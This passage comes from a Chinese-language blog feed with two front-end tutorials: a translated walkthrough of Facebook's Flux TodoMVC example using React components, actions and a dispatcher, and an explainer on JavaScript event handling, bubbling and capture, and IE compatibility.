class="line">    );</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">&#125;);</div><div class="line"></div><div class="line">module.exports = TodoApp;</div></pre></td></tr></table></figure>
<p>现在我们处于我们所熟悉的React范围内，利用React的生命周期方法。我们利用<code>getInitialState()</code>初始化<code>controller-view</code>，利用<code>componentDidMount()</code>注册事件的监听，使用<code>componentWillUnmount()</code>进行清除。我们渲染div容器，从TodoStore得到数据传入state。</p>
<p>Header组件中包含应用主要的input，但是不需要知道store的状态。而组件MainSection、Footer需要这些数据，因此我们向它俩传入。</p>
<h2 id="更多的View"><a href="#更多的View" class="headerlink" title="更多的View"></a>更多的View</h2><p>React组件顶层结构应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;TodoApp&gt;</div><div class="line">  &lt;Header&gt;</div><div class="line">    &lt;TodoTextInput /&gt;</div><div class="line">  &lt;/Header&gt;</div><div class="line"></div><div class="line">  &lt;MainSection&gt;</div><div class="line">    &lt;ul&gt;</div><div class="line">      &lt;TodoItem /&gt;</div><div class="line">    &lt;/ul&gt;</div><div class="line">  &lt;/MainSection&gt;</div><div class="line"></div><div class="line">&lt;/TodoApp&gt;</div></pre></td></tr></table></figure>
<p>如果TodoItem处于编辑状态，渲染TodoTextInput作为子元素。让我们来看一看这些组件是如何将作为props的数据展示出来的，如何利用dispatcher来action通信的。MainSection需要去遍历接受自TodoApp所创建的to-do单元集合。在组件的render方法中，我们可以看到遍历器是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> allTodos = <span class="keyword">this</span>.props.allTodos;</div><div class="line"></div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> allTodos) &#123;</div><div class="line">  todos.push(<span class="xml"><span class="tag">&lt;<span class="name">TodoItem</span> <span class="attr">key</span>=<span class="string">&#123;key&#125;</span> <span class="attr">todo</span>=<span class="string">&#123;allTodos[key]&#125;</span> /&gt;</span>);</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">return (</div><div class="line">  <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"todo-list"</span>&gt;</span>&#123;todos&#125;<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></div><div class="line">);</div></pre></td></tr></table></figure>
<p>如今，每一个Todo单元都展示自己的内容，利用他们自己的ID去执行action。解释Todo单元上所有不同的action已经超出本文的范围，你可以查看代码仓库，但是让我来看一看to-do单元的删除操作，以下是一个简略的版本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"><span class="keyword">var</span> TodoActions = <span class="built_in">require</span>(<span class="string">'../actions/TodoActions'</span>);</div><div class="line"><span class="keyword">var</span> TodoTextInput = <span class="built_in">require</span>(<span class="string">'./TodoTextInput.react'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> TodoItem = React.createClass(&#123;</div><div class="line"></div><div class="line">  propTypes: &#123;</div><div class="line">    todo: React.PropTypes.object.isRequired</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> todo = <span class="keyword">this</span>.props.todo;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      <span class="xml"><span class="tag">&lt;<span class="name">li</span></span></span></div><div class="line">        <span class="attr">key</span>=<span class="string">&#123;todo.id&#125;</span>&gt;</div><div class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span></div><div class="line">          &#123;todo.text&#125;</div><div class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">"destroy"</span> <span class="attr">onClick</span>=<span class="string">&#123;this._onDestroyClick&#125;</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    );</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  _onDestroyClick: function() &#123;</div><div class="line">    TodoActions.destroy(this.props.todo.id);</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">module.exports = TodoItem;</div></pre></td></tr></table></figure>
<p>随着TodoAction中删除的action可以使用，store已经可以被操作了，与用户的行为进行交互来改变应用的state再简单不过。我们通过所提供的id，利用click事件触发删除的。现在用户可以点击删除的按钮，开始Flux流程去更新应用了。</p>
<p>另一方面, Text input就有一些复杂因为我们需要等待在React组件中text input本身的state。让我们来看看TodoTextInput是如何工作的。</p>
<p>让我们看看下面这段代码，React期望我们更新component的state随着input每一次的改变。所以当我们最终将文本保存进input时，我们将值储存于组件的state中。这是UI的state，而不是应用的，保持这个差异很好地指引了state应该在哪里被储存。所有应用的state应存在于store，虽然React组件偶尔会保持在UI state中，理想中应尽可能少得保持state。</p>
<p>因为TodoTextInput在我们的应用中被应用于多处，具有不同的行为，我们需要通过onSave方法，传自组件父层的prop。这样就允许通过传入不同的onSave去执行不同的操作。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"><span class="keyword">var</span> ReactPropTypes = React.PropTypes;</div><div class="line"></div><div class="line"><span class="keyword">var</span> ENTER_KEY_CODE = <span class="number">13</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> TodoTextInput = React.createClass(&#123;</div><div class="line"></div><div class="line">  propTypes: &#123;</div><div class="line">    className: ReactPropTypes.string,</div><div class="line">    id: ReactPropTypes.string,</div><div class="line">    placeholder: ReactPropTypes.string,</div><div class="line">    onSave: ReactPropTypes.func.isRequired,</div><div class="line">    value: ReactPropTypes.string</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  getInitialState: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      value: <span class="keyword">this</span>.props.value || <span class="string">''</span></div><div class="line">    &#125;;</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * @return &#123;object&#125;</div><div class="line">   */</div><div class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) /*<span class="title">object</span>*/ </span>&#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      <span class="xml"><span class="tag">&lt;<span class="name">input</span></span></span></div><div class="line">        <span class="attr">className</span>=<span class="string">&#123;this.props.className&#125;</span></div><div class="line">        <span class="attr">id</span>=<span class="string">&#123;this.props.id&#125;</span></div><div class="line">        <span class="attr">placeholder</span>=<span class="string">&#123;this.props.placeholder&#125;</span></div><div class="line">        <span class="attr">onBlur</span>=<span class="string">&#123;this._save&#125;</span></div><div class="line">        <span class="attr">onChange</span>=<span class="string">&#123;this._onChange&#125;</span></div><div class="line">        <span class="attr">onKeyDown</span>=<span class="string">&#123;this._onKeyDown&#125;</span></div><div class="line">        <span class="attr">value</span>=<span class="string">&#123;this.state.value&#125;</span></div><div class="line">        <span class="attr">autoFocus</span>=<span class="string">&#123;true&#125;</span></div><div class="line">      /&gt;</div><div class="line">    );</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  /**</div><div class="line">   * 传入onSave能够提高这个组件的可扩展性和复用性，onSave可能是建立一条记录，也可能是修改一条记录</div><div class="line">   */</div><div class="line">  _save: function() &#123;</div><div class="line">    // app的state</div><div class="line">    this.props.onSave(this.state.value);</div><div class="line">    this.setState(&#123;</div><div class="line">      value: ''</div><div class="line">    &#125;);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  /**</div><div class="line">   * @param &#123;object&#125; event</div><div class="line">   */</div><div class="line">  _onChange: function(/*object*/ event) &#123;</div><div class="line">    // UI的state</div><div class="line">    this.setState(&#123;</div><div class="line">      value: event.target.value</div><div class="line">    &#125;);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  /**</div><div class="line">   * @param &#123;object&#125; event</div><div class="line">   */</div><div class="line"></div><div class="line">  _onKeyDown: function(event) &#123;</div><div class="line">    if (event.keyCode === ENTER_KEY_CODE) &#123;</div><div class="line">      this._save();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;);</div><div class="line"></div><div class="line">module.exports = TodoTextInput;</div></pre></td></tr></table></figure>
<p>Header中的onSave就是让TodoTextInput去创建一个新的to-do单元:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"><span class="keyword">var</span> TodoActions = <span class="built_in">require</span>(<span class="string">'../actions/TodoActions'</span>);</div><div class="line"><span class="keyword">var</span> TodoTextInput = <span class="built_in">require</span>(<span class="string">'./TodoTextInput.react'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> Header = React.createClass(&#123;</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * @return &#123;object&#125;</div><div class="line">   */</div><div class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      <span class="xml"><span class="tag">&lt;<span class="name">header</span> <span class="attr">id</span>=<span class="string">"header"</span>&gt;</span></span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>todos<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">TodoTextInput</span></span></div><div class="line">          <span class="attr">id</span>=<span class="string">"new-todo"</span></div><div class="line">          <span class="attr">placeholder</span>=<span class="string">"What needs to be done?"</span></div><div class="line">          <span class="attr">onSave</span>=<span class="string">&#123;this._onSave&#125;</span></div><div class="line">        /&gt;</div><div class="line">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></div><div class="line">    );</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  /**</div><div class="line">   * 在TodoTextInput内被调用，用于创建</div><div class="line">   * @param &#123;string&#125; text</div><div class="line">   */</div><div class="line">  _onSave: function(text) &#123;</div><div class="line">    TodoActions.create(text);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;);</div><div class="line"></div><div class="line">module.exports = Header;</div></pre></td></tr></table></figure>
<p>在不同的环境中，就像编辑一个已经存在的to-do单元，_onSave的回调函数就需要用<code>TodoActions.update(text)</code>来代替。</p>
<h2 id="创建语义化的actions"><a href="#创建语义化的actions" class="headerlink" title="创建语义化的actions"></a>创建语义化的actions</h2><p>这是最基础的代码在我们的view中所使用的action:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * TodoActions</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="keyword">var</span> AppDispatcher = <span class="built_in">require</span>(<span class="string">'../dispatcher/AppDispatcher'</span>);</div><div class="line"><span class="keyword">var</span> TodoConstants = <span class="built_in">require</span>(<span class="string">'../constants/TodoConstants'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> TodoActions = &#123;</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * @param  &#123;string&#125; text</div><div class="line">   */</div><div class="line">  create: <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</div><div class="line">    AppDispatcher.handleViewAction(&#123;</div><div class="line">      actionType: TodoConstants.TODO_CREATE,</div><div class="line">      text: text</div><div class="line">    &#125;);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">   * @param  &#123;string&#125; id</div><div class="line">   */</div><div class="line">  destroy: <span class="function"><span class="keyword">function</span>(<span class="params">id</span>) </span>&#123;</div><div class="line">    AppDispatcher.handleViewAction(&#123;</div><div class="line">      actionType: TodoConstants.TODO_DESTROY,</div><div class="line">      id: id</div><div class="line">    &#125;);</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = TodoActions;</div></pre></td></tr></table></figure>
<p>你可以看到，我们并不需要<code>AppDispatcher.handleViewAction()</code>或是<code>TodoActions.create()</code>这样的帮助。在理论上，直接定义为<code>AppDispatcher.dispatch()</code>，向其提供payload。但随着我们应用的增长，具有帮助能使我们的代码保持整洁与语义化。清楚地定义<code>TodoActions.destroy(id)</code>好过于写了一堆无法明白的东西。</p>
<p><code>TodoActions.create()</code>生成payload像这样:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  source: <span class="string">'VIEW_ACTION'</span>,</div><div class="line">  action: &#123;</div><div class="line">    type: <span class="string">'TODO_CREATE'</span>,</div><div class="line">    text: <span class="string">'Write blog post about Flux'</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>payload通过所注册的回调函数被提供给TodoStore，TodoStore广播’change’事件，MainSection会做出响应，从TodoStore中获取最新的to-do集合，然后改变他的state。这个改变来源于TodoApp组件所定义的render()方法，其它组件的render方法都是它的子代。</p>
<h2 id="从顶层开始"><a href="#从顶层开始" class="headerlink" title="从顶层开始"></a>从顶层开始</h2><p>在我们的应用中，引导文件是app.js，仅含有TodoApp组件，render作为应用的根元素。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> TodoApp = <span class="built_in">require</span>(<span class="string">'./components/TodoApp.react'</span>);</div><div class="line"></div><div class="line">React.render(</div><div class="line">  <span class="xml"><span class="tag">&lt;<span class="name">TodoApp</span> /&gt;</span>,</span></div><div class="line">  document.getElementById('todoapp')</div><div class="line">);</div></pre></td></tr></table></figure>
<h2 id="为Dispatcher添加依赖管理"><a href="#为Dispatcher添加依赖管理" class="headerlink" title="为Dispatcher添加依赖管理"></a>为Dispatcher添加依赖管理</h2><p>在我之前所说的，我们的Dispatcher是原生的，这是十分棒的，但不能满足大多数应用。与Store之间，我们需要一个方法去管理依赖，所以我们设计了waitFor()在Dispatcher内。</p>
<p>waitFor()方法返回一个Promise，这个Promise依次序返回Store的回调函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * @param  &#123;array&#125; promiseIndexes</div><div class="line"> * @param  &#123;function&#125; callback</div><div class="line"> */</div><div class="line">waitFor: <span class="function"><span class="keyword">function</span>(<span class="params">promiseIndexes, callback</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> selectedPromises = promiseIndexes.map(<span class="function"><span class="keyword">function</span>(<span class="params">index</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> _promises[index];</div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.all(selectedPromises).then(callback);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在对于TodoStore的回调函数我们可以明确地等待任何依赖先更新后再向前推进。然而StoreA等待StoreB，StoreB等待StoreA，会出现循环依赖。面对这一情况，一个健壮的dispatcher可在控制台中发出警告。</p>
<h2 id="Flux的未来"><a href="#Flux的未来" class="headerlink" title="Flux的未来"></a>Flux的未来</h2><p>很多人问FaceBook是否打算将flux作为一个开源框架。事实上，Flux代表是一种结构，而不是框架。这个项目作为Flux的模板工程会十分有意义。请让我们知道你喜欢我们所做的。</p>
<p>感谢你花时间阅读如何构建客户端应用在Facebook中。我们希望我们能向你证明Flux是有用的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文地址: &lt;a href=&quot;https://facebook.github.io/flux/docs/todo-list.html&quot;&gt;https://facebook.github.io/flux/docs/todo-list.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://cc.cocimg.com/api/uploads/20150928/1443408513171463.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;让我们用一个经典的TodoMVC的应用的简单代码来展示一下Flux的结构体系。虽然完整的项目案例你可以在Github中&lt;a href=&quot;https://github.com/facebook/flux/tree/master/examples/flux-todomvc/&quot;&gt;下载&lt;/a&gt;得到，但是还是让我们一步步来完成开发。&lt;/p&gt;
    
    </summary>
    
      <category term="React全家桶" scheme="http://blackganglion.com/categories/React%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    
      <category term="Flux" scheme="http://blackganglion.com/tags/Flux/"/>
    
  </entry>
  
  <entry>
    <title>The Event Of JavaScript</title>
    <link href="http://blackganglion.com/2016/02/26/The-Event-Of-JavaScript/"/>
    <id>http://blackganglion.com/2016/02/26/The-Event-Of-JavaScript/</id>
    <published>2016-02-26T11:08:00.000Z</published>
    <updated>2016-07-08T15:19:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>当我们打开网页时，我们会触发各种各样的事件，比如加载页面完成就会触发<code>onload</code>事件，点击某个元素就会触发其<code>click</code>事件。那么我们应该如何为我们的DOM元素绑定事件？一般操作事件会有三种方式:</p>
<h2 id="HTML事件处理程序-直接HTML内联属性（不建议这么做"><a href="#HTML事件处理程序-直接HTML内联属性（不建议这么做" class="headerlink" title="HTML事件处理程序 - 直接HTML内联属性（不建议这么做)"></a>HTML事件处理程序 - 直接HTML内联属性（不建议这么做)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--</span></div><div class="line">这种方式使代码耦合，将javascript代码直接嵌入到了html中，不利于后期的代码维护，也不利于书写较长代码。</div><div class="line">--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"alert('你点击了按钮');"</span>&gt;</span>点击按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="DOM-0级事件处理程序-DOM属性的绑定"><a href="#DOM-0级事件处理程序-DOM属性的绑定" class="headerlink" title="DOM 0级事件处理程序 - DOM属性的绑定"></a>DOM 0级事件处理程序 - DOM属性的绑定</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 采用属性赋值的形式，比较简单，但容易被覆盖</span></div><div class="line">element.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    alert(<span class="string">'你点击了按钮'</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="DOM-2级事件处理程序-使用标准的事件监听函数"><a href="#DOM-2级事件处理程序-使用标准的事件监听函数" class="headerlink" title="DOM 2级事件处理程序 - 使用标准的事件监听函数"></a>DOM 2级事件处理程序 - 使用标准的事件监听函数</h2><p>为DOM元素添加事件: </p>
<p><strong>element.addEventListener(event, function, useCapture)</strong></p>
<p>为DOM元素移出事件: </p>
<p><strong>element.removeEventListener(event, function, useCapture)</strong></p>
<p><code>event</code>为事件名称，<code>function</code>为事件触发后的回调函数，<code>useCapture</code>为一个用户选项</p>
<p><code>useCapture</code>指定事件是在捕获阶段执行还是冒泡阶段执行，默认为false在冒泡阶段执行，true则为事件句柄在捕获阶段执行</p>
<p>这里就不得不提DOM的事件流，”DOM2级事件”规定事件流包括3个阶段：事件捕获阶段、处于目标阶段和事件冒泡阶段</p>
<p><img src="https://www.w3.org/TR/DOM-Level-3-Events/images/eventflow.svg" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/477973/201302/18141423-8bd09a9c1e184df9a13b6e26b88348f3.jpg" alt=""></p>
<p>当我们在DOM树上的某个节点发生操作时，就会有一个事件发出。这个事件从window发出，通过DOM树到达目标节点，也就是发生操作的节点。捕获过程中，凡是经过节点上有该事件是定义在捕获阶段执行的，就会被触发。</p>
<p>冒泡阶段与捕获阶段原理基本相同，到达目的节点，目标阶段结束后，会依据冒泡阶段的DOM树路径返回，触发经过节点对于该事件在冒泡阶段的执行。</p>
<p>利用事件冒泡的机制，我们能够减少对于元素的大量绑定，只需统一绑定在父元素上即可，也称为事件委托，有利于页面整体运行的性能。同时我们需要进行一些DOM节点的插入与删除，仅仅绑定在一个节点上往往会由于插入删除而失效，事件冒泡也能很好地解决这个问题。</p>
<p>当然你如果只想触发特定元素上的绑定事件，可以在回调函数中使用<code>event.stopPropagation()</code>来阻止事件的冒泡，<strong>注意：该函数并非是来阻止冒泡阶段发生的，而是执行后终止该事件继续传播，无论其处于什么阶段</strong></p>
<p>在触发DOM上的某个事件时，会产生一个事件对象event，之前已经略有提及。其包含了许多与事件相关的属性与方法，比较常见的有：</p>
<p><code>event.type</code> 被触发的事件类型，比如’click’, ‘mouseover’;</p>
<p><code>event.target</code> 事件的目标，注意与<code>event.currentTarget</code>的区别，currentTarget为当前正在处理事件的元素，可能为冒泡或是捕获阶段，target目标元素的父元素;</p>
<p><code>event.clientX/Y</code> 是在事件发生时，鼠标指针与可视区域网页顶部和左部的距离。<code>event.pageX/Y</code>与其稍稍不同，是与整个网页的顶部和左部距离。在没有滚动条的情况下两者的值是一致的，有滚动条的情况下，pageX &gt;= clientX，pageY &gt;= clientY;</p>
<p><code>event.preventDefault()</code> 取消事件的默认行为，比如a标签的超链接;</p>
<p>在javascript的事件处理中，我们有时还需要考虑到IE的兼容性。比如，上文提及的DOM方法中<code>addEventListener</code>对应IE的<code>attachEvent</code>，<code>removeEventListener</code>对应IE的<code>detachEvent</code>，在此方法下，事件处理程序会在全局作用域中运行。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>);</div><div class="line">btn.attachEvent(<span class="string">"onclick"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    alert(<span class="keyword">this</span> === <span class="built_in">window</span>) <span class="comment">// true</span></div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">// 将addEventListener与attachEvent集成到addEvent上</span></div><div class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.addEventListener) &#123;</div><div class="line">    <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span>(<span class="params">elem, type, fn</span>) </span>&#123;</div><div class="line">        elem.addEventListener(type, fn, <span class="literal">false</span>);</div><div class="line">        <span class="keyword">return</span> fn; </div><div class="line">    &#125;;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">document</span>.attachEvent) &#123;</div><div class="line">    <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span>(<span class="params">elem, type, fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> bound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="comment">// 将this绑定在elem上</span></div><div class="line">            <span class="keyword">return</span> fn.apply(elem, <span class="built_in">arguments</span>);</div><div class="line">        &#125;</div><div class="line">        elem.attachEvent(<span class="string">"on"</span> + type, bound);</div><div class="line">        <span class="keyword">return</span> bound;</div><div class="line">    &#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>IE中的事件对象与DOM的也略有不同，我们也建议在书写时考虑浏览器的兼容性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( !event.target ) &#123;</div><div class="line">    event.target = event.srcElement || <span class="built_in">document</span>;</div><div class="line">&#125;</div><div class="line">event.preventDefault = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    event.returnValue = <span class="literal">false</span>;</div><div class="line">&#125;;</div><div class="line">event.stopPropagation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    event.cancelBubble = <span class="literal">true</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>上周做了拉钩网首页一个小效果的<a href="https://github.com/BlackGanglion/Practice/tree/master/javascript-practice/2.19" target="_blank" rel="external">demo</a>，其中需要根据鼠标移入移出元素来实现js效果，这里我留意到了鼠标移动事件。</p>
<p>目前存在两组鼠标移动事件，<code>mouseover</code>与<code>mouseout</code>均会冒泡，并且不论鼠标指针穿过被选元素或其子元素，都会触发事件，而且无法阻止其冒泡；<code>mouseenter</code>与<code>mouseleave</code>则不冒泡，只有在鼠标指针穿过被选元素时，才会触发事件。一般我们为了防止事件反复触发，以及动画的抖动，选择<code>mouseenter/mouseleave</code>事件。</p>
]]></content>
    
    <summary type="html">
    
